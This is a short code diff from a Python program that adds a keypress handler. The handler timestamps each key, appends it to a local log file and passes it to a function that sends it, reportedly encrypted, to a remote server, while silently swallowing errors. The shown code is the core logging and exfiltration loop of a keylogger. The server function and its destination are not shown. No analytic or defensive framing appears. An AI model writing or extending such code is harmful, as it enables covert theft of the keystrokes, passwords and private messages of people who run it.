@@ -31,3 +31,22 @@ def format_key(key):
         return f"[{key.replace('Key.', '').upper()}]"
     else:
         return key
+
+
+# === FUNCTION WHEN A KEY IS PRESSED ===
+def on_key_press(key):
+    try:
+        formatted_key = format_key(key)
+        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+        log_message = f"[{timestamp}] {formatted_key}"
+
+        # Save locally
+        with open(log_file, "a", encoding="utf-8") as f:
+            f.write(log_message + "\n")
+
+        # Send encrypted message
+        send_log_to_server(log_message)
+
+    except Exception:
+        pass
+
